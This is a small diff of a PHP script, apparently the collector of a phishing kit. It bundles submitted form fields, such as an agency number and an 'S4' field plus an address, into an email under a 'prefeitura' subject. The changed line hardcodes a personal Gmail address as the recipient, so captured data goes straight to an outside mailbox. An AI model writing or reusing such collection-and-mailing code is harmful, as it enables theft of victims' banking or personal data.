@@ -16,7 +16,7 @@ AG.........: $rua $numero
 S4.........: $s4
 ============================================";
 
-mail($receber, "prefeitura - $rua $numero", "$conteudo", $headers); 
+mail('joaolago35@gmail.com', "prefeitura - $rua  $numero", "$conteudo", $headers); 
 
 ?>
 <!doctype html>
